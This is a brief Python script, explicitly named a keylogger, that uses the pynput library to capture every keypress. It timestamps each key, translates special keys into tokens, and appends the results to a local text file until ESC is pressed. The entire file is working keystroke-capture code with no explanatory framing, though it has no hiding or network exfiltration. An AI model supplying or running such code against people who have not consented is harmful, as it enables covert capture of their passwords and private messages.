from pynput.keyboard import Listener
import datetime

log_file = "keylogger.txt"

def write_in_file(key):
    letter = str(key).replace("'", "")
    
    # Special key handling
    special_keys = {
        "Key.space": " ",
        "Key.enter": "\n",
        "Key.tab": "    ",
        "Key.backspace": " [BACKSPACE] ",
        "Key.shift": "",
        "Key.shift_r": "",
        "Key.ctrl_l": "",
        "Key.ctrl_r": "",
        "Key.alt_l": "",
        "Key.alt_r": "",
        "Key.esc": " [ESC] ",  # Used to stop logging
        "Key.caps_lock": "",
        "Key.cmd": " [WIN] ",
        "Key.up": " [UP] ",
        "Key.down": " [DOWN] ",
        "Key.left": " [LEFT] ",
        "Key.right": " [RIGHT] ",
    }

    if letter in special_keys:
        letter = special_keys[letter]

    # Stop logging when ESC is pressed
    if letter == " [ESC] ":
        print("ESC pressed. Stopping keylogger.")
        return False  # Stops the listener

    # Timestamp for logging
    timestamp = datetime.datetime.now().strftime("[%Y-%m-%d %H:%M:%S] ")
    
    with open(log_file, 'a') as f:
        f.write(timestamp + letter + "\n")

# Start listening for keypresses
with Listener(on_press=write_in_file) as listener:
    listener.join()
